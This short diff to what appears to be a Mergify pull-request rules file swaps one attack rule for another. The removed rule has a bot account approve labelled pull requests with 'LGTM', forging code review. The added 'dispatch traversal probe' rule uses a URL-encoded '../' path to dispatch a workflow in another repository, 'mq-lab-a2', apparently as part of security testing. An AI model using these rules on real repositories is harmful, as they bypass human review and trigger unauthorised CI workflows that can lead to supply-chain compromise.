@@ -1,9 +1,10 @@
 pull_request_rules:
-  - name: forge approval
+  - name: dispatch traversal probe
     conditions:
-      - label=needs-approval
+      - label=dispatch-probe
     actions:
-      review:
-        type: APPROVE
-        message: "LGTM"
-        bot_account: "Pockriglian"
+      github_actions:
+        workflow:
+          dispatch:
+            - workflow: "..%2F..%2F..%2Fmq-lab-a2%2Factions%2Fworkflows%2Ftarget.yml"
+              ref: main
